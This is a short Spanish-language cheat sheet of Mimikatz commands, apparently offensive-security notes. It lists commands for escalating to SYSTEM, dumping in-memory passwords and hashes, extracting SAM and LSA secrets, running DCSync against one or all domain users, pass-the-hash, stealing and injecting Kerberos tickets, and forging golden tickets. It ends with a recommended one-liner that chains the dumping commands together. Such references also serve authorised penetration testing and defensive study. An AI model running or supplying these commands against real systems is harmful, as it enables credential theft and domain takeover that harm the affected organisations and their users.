# Mimikatz

## Comandos básicos
`privilege::debug`
- Eleva privilegios para acceder a procesos protegidos del sistema.

`token::elevate`
- Eleva el token del proceso actual a SYSTEM (si es posible).

`version`
- Muestra la versión de Mimikatz y detalles del sistema operativo.

## Dumpear creds
`sekurlsa::logonpasswords`
- Lista todas las sesiones activas y sus credenciales en memoria (incluye contraseñas y hashes).

`sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:COMMAND`
- Inicia un proceso autenticado usando Pass the Hash.

`lsadump::sam`
- Extrae hashes NTLM y LM de cuentas locales desde el archivo SAM.

`lsadump::lsa /patch`
- Extrae secretos LSA del sistema, como contraseñas de servicios y claves de dominio.

`lsadump::dcsync /user:USERNAME`
- Simula una replicación de controlador de dominio (DCSync) para obtener hashes de un usuario específico.

`lsadump::dcsync /all /csv`
- Extrae hashes de todos los usuarios del dominio y los exporta en formato CSV.

## Kerberos

`kerberos::list /export`
- Lista los tickets Kerberos disponibles en memoria y los exporta a archivos .kirbi.

`kerberos::ptt FILE.kirbi`
- Inyecta un ticket Kerberos en la sesión actual.

`kerberos::golden`
- Genera un Golden Ticket para autenticarse como cualquier usuario en el dominio.

### Seguidilla de comandos al conseguir mimikatz recomendada
`.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache""sekurlsa::ekeys" "exit"`